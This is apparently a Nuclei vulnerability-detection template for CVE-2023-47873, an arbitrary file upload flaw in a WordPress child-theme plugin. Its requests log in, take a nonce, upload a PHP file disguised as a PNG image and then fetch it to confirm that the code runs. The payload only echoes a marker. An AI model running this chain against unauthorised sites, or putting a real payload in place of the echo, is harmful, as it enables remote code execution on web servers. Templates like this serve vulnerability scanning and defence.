id: CVE-2023-47873

info:
  name: WordPress WP Child Theme Generator < 1.1.3 - Arbitrary File Upload
  author: cysamu,Crux
  severity: critical
  description: |
    The WP Child Theme Generator plugin before 1.1.3 does not validate uploaded files before saving it to the server, leading to an Arbitrary File Upload vulnerability.
    This vulnerability is exploitable by authenticated users and can be used to achieve remote code execution.
  remediation: Update to version 1.1.3 or later
  reference:
    - https://github.com/certuscyber/cve-pocs/tree/main/CVE-2023-47873
    - https://patchstack.com/database/wordpress/plugin/wp-child-theme-generator/vulnerability/wordpress-wp-child-theme-generator-plugin-1-0-8-arbitrary-file-upload-vulnerability
    - https://en-ca.wordpress.org/plugins/wp-child-theme-generator/
  classification:
    cve-id: CVE-2023-47873
    cwe-id: CWE-434
  metadata:
    verified: true
    max-request: 4
  tags: wordpress,wp,wp-plugin,fileupload,wp-child-theme-generator,rce,remote-code-execute,wpscan

variables:
  string: "CVE-2023-47873"
  name: "cve-2023-47873" # Cannot use randstr because the value must be lowercase.

http:
  - raw:
      - |
        POST /wp-login.php HTTP/2
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        log={{username}}&pwd={{password}}&wp-submit=Log+In&redirect_to=https%3A%2F%2Fwpscan-vulnerability-test-bench.ddev.site%2Fwp-admin%2F&testcookie=1

      - |
        GET /wp-admin/themes.php?page=custom-child-theme HTTP/2
        Host: {{Hostname}}

      - |
        POST /wp-admin/admin-post.php HTTP/2
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----geckoformboundaryfbbbd275d3ea5d30b67d44817dde50f8

        ------geckoformboundaryfbbbd275d3ea5d30b67d44817dde50f8
        Content-Disposition: form-data; name="childtheme"

        {{name}}
        ------geckoformboundaryfbbbd275d3ea5d30b67d44817dde50f8
        Content-Disposition: form-data; name="childauthor"

        aaa
        ------geckoformboundaryfbbbd275d3ea5d30b67d44817dde50f8
        Content-Disposition: form-data; name="description"

        aaa
        ------geckoformboundaryfbbbd275d3ea5d30b67d44817dde50f8
        Content-Disposition: form-data; name="fileUpload"; filename="image.php"
        Content-Type: image/png

        <?php echo "{{string}}";?>
        ------geckoformboundaryfbbbd275d3ea5d30b67d44817dde50f8
        Content-Disposition: form-data; name="wp-easy-nonce"

        {{nonce}}
        ------geckoformboundaryfbbbd275d3ea5d30b67d44817dde50f8
        Content-Disposition: form-data; name="action"

        child_theme
        ------geckoformboundaryfbbbd275d3ea5d30b67d44817dde50f8
        Content-Disposition: form-data; name="custom-child-create"

        Create Child Theme
        ------geckoformboundaryfbbbd275d3ea5d30b67d44817dde50f8--

      - |
        GET /wp-content/themes/{{name}}/screenshot.php HTTP/2
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - status_code_4 == 200
          - contains(body_4, "{{string}}")
        condition: and

    extractors:
      - type: regex
        name: nonce
        group: 1
        regex:
          - name="wp-easy-nonce" value="([0-9a-zA-Z]+)"
        internal: true